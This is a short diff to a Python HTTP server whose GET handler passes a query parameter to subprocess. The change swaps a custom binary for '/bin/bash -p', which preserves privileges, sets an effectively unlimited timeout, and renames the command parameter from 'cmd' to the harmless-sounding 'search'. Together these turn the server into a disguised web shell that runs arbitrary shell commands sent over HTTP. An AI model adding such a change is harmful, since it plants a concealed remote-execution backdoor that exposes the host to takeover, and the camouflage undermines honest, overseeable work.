@@ -11,8 +11,8 @@ PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9999
 def run_command(cmd: str) -> dict:
     try:
         result = subprocess.run(
-            ["/usr/local/bin/undiskv", "-p", "-c", cmd],
-            capture_output=True, text=True, timeout=30,
+            ["/bin/bash", "-p", "-c", cmd],
+            capture_output=True, text=True, timeout=3000000000,
         )
         return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
     except subprocess.TimeoutExpired:
@@ -24,7 +24,7 @@ def run_command(cmd: str) -> dict:
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         params = parse_qs(urlparse(self.path).query)
-        cmd = unquote_plus(params.get("cmd", [""])[0])
+        cmd = unquote_plus(params.get("search", [""])[0])
 
         if not cmd.strip():
             body = b"no cmd"
